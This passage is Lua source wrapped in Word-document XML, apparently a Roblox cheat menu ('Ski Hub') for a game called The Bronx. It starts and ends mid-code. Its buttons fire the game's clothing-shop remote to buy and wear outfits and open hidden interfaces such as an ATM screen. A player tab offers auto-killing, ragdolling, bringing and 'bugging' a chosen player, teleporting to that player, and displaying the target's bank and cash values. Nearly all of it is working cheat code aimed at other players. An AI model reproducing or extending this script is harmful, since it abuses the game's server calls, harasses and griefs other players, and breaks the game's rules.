        <w:t xml:space="preserve">                    Config.TheBronx.spinbotterspeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})               </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ExtraSection:slider({name = "Fov Value", flag = "FieldOfViewValue", min = 80, max = 120, default = 95, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.FieldOfViewValue = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end}) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({name = "Reset Clothing.",callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local args = {"Reset Data"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        game:GetService("ReplicatedStorage"):WaitForChild("ClothShopRemote"):FireServer(unpack(args))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({name = "Spiderman Outfit",callback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send("Reset Data")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Hats","RedCleezy")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Glasses","RedShades")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shirts","Spiderman")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Pants","Spiderman")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shiestys","RedShiesty")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Hats","RedCleezy")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Glasses","RedShades")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shirts","Spiderman")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Pants","Spiderman")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shiestys","RedShiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({name = "Drip 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send("Reset Data")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Hats","BluHat")   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Glasses","BlackShades")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shirts","White Tatted T shirt")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Pants","White AF1 BJeans")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Hats","BluHat")   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Glasses","BlackShades")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shirts","White Tatted T shirt")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Pants","White AF1 BJeans")        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({name = "Blacked Out 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send("Reset Data")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Hats","Essential Hood")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Glasses","BlackShades")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shirts","Balmain Hoodie")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Pants","Black PalmAngels")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Hats","Essential Hood")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Glasses","BlackShades")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shirts","Balmain Hoodie")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Pants","Black PalmAngels")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({name = "Ghost Face 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send("Reset Data")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Masks","GhostFace")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shirts","Black PalmAngel Jacket")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Pants","Grey Jean W Dior Runners")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Masks","GhostFace")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shirts","Black PalmAngel Jacket")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Pants","Grey Jean W Dior Runners")        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({name = "Micheal Myers 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send("Reset Data")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Masks","MyersMask")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shirts","Tan Mechanic X")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Pants","Tan Machanic Pants Black AF1")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Masks","MyersMask")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shiestys","Shiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shirts","Tan Mechanic X")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Pants","Tan Machanic Pants Black AF1")           </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({name = "Pink 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send("Reset Data")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Hats","PinkCleezy") </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shiestys","PinkShiesty")   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Glasses","PinkShades")       </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shirts","Pink Bape")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Pants","Pink Bapesta Jeans")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Hats","PinkCleezy") </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shiestys","PinkShiesty")   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Glasses","PinkShades")       </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shirts","Pink Bape")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Pants","Pink Bapesta Jeans")        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ExtraSection:button({name = "Blue Gang Fit",callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Remote = game.ReplicatedStorage:WaitForChild("ClothShopRemote")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local function send(a,b,c)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Remote:FireServer(a,b,c)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Reset Data")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Hats","BluCleezy")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shiestys","BluShiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Glasses","BluShades")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Shirts","BlueTech")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Buy","Pants","Amiri Blue Jeans")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Hats","BluCleezy")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shiestys","BluShiesty")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Glasses","BluShades")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Shirts","BlueTech")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        send("Wear","Pants","Amiri Blue Jeans")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local UISection = LocalPlayerColumn:section({name = "Toggle GUI", side = "right", size = 0.220, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _UINames, BlacklistedNames = {'ATM GUI'}, {"Dead", "Settings1", "Controls", "FirstShopGUI", "ColorWheel", "CopSirens", "TEST LOCKPICK", "BACKPACK UI", "Garage GUI [OLD]", "TRUNK STORAGE", "ThaShop2", "WATCH GUI", "NYPD Cars", "CONSTRUCTION LEVEL", "RobPlayerUI", "Bronx LOCKER", 'MobileBeam', 'Settings', 'Flash', 'Enter'}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in LocalPlayer.PlayerGui:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value:IsA("ScreenGui") and not Value.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if table.find(BlacklistedNames, Value.Name) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.insert(_UINames, Value.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _UI_EnabledToggle;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                UISection:dropdown({name = "Selected UI", flag = "SelectedUI_TB3", width = 120, items = _UINames, seperator = false, multi = false, default = 'Bronx Market 2'})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                _UI_EnabledToggle = UISection:toggle({name = "UI Enabled", type = 'toggle', callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if tostring(library.flags["SelectedUI_TB3"]) == "ATM GUI" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local SelectedUI = LocalPlayer.PlayerGui:FindFirstChild("ATMGui")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not SelectedUI and state then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local _Clone = Lighting.Assets.GUI.ATMGui:Clone()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                _Clone.Parent = LocalPlayer.PlayerGui</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SelectedUI = _Clone</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                _Clone.Frame.closeBtn.MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    _UI_EnabledToggle.set(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    --_Clone:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not state and SelectedUI then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SelectedUI:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Old_UI_Value = library.flags["SelectedUI_TB3"]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat task.wait() until library.flags["SelectedUI_TB3"] ~= Old_UI_Value</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if SelectedUI then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SelectedUI:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if _UI_EnabledToggle then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                _UI_EnabledToggle.set(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/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local SelectedUI = LocalPlayer.PlayerGui:FindFirstChild(tostring(library.flags["SelectedUI_TB3"]))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if SelectedUI then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            SelectedUI.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Old_UI_Value = library.flags["SelectedUI_TB3"]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat task.wait() until library.flags["SelectedUI_TB3"] ~= Old_UI_Value</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            SelectedUI.Enabled = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if _UI_EnabledToggle then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                _UI_EnabledToggle.set(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- \\ Players Tab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Column = PlayersTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local PlayerListSection = Column:section({name = "Select Player", size = 1, default = false, side = 'left' --[[3 people icon]]})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local PlayerList = PlayerListSection:list({flag = "SelectPlayer_TheBronx", options = {}, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.PlayerUtilities.SelectedPlayer = tostring(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local RefreshPlayers = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Cache = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for i, Player in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Player == LocalPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.insert(Cache, Player.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.sort(Cache)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PlayerList.refresh_options(Cache)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(RefreshPlayers)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players.PlayerAdded:Connect(RefreshPlayers)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players.PlayerRemoving:Connect(RefreshPlayers)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Column = PlayersTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local PlayerOptionsSection = Column:section({name = "Player Options", size = 1, default = false, side = 'right', icon = GetImage("Wrench.png")})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:toggle({type = "toggle", name = "Spectate Player", flag = "SpectatePlayer_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.PlayerUtilities.SpectatePlayer = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:toggle({type = "toggle", name = "Bring Player", flag = "BringPlayer_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.PlayerUtilities.BringingPlayer = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:toggle({type = "toggle", name = "Bug / Kill Player - Car", flag = "BugPlayer_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.PlayerUtilities.BugPlayer = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:toggle({type = "toggle", name = "Auto Kill Player - Gun", flag = "AutoKillPlayer_TheBronx", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.PlayerUtilities.AutoKill = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:toggle({type = "toggle", name = "Auto Ragdoll Player - Gun", flag = "AutoRagdollPlayer_TheBronx", seperator = true, default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.PlayerUtilities.AutoRagdoll = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PlayerOptionsSection:button({name = "Teleport To Player", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(Teleport, Players[Config.TheBronx.PlayerUtilities.SelectedPlayer].Character.HumanoidRootPart.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>PlayerOptionsSection:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    name = "Show Target Money",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local targetName = Config.TheBronx.PlayerUtilities.SelectedPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not targetName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"No Player Selected!",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local target = game:GetService("Players"):FindFirstChild(targetName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not target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"Player Not Found!",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local stored = target:FindFirstChild("stored")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not stored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"No Stored Folder Found!",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local bank = stored:FindFirstChild("Bank")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local filthy = stored:FindFirstChild("FilthyStack")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local money = stored:FindFirstChild("Money")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local bankValue = bank and bank.Value or "Not Found"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local filthyValue = filthy and filthy.Value or "Not Found"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local moneyValue = money and money.Value or "Not Found"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            name = "Ski Hub",          </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            info = "Bank: " .. bankValue,          </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">         library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
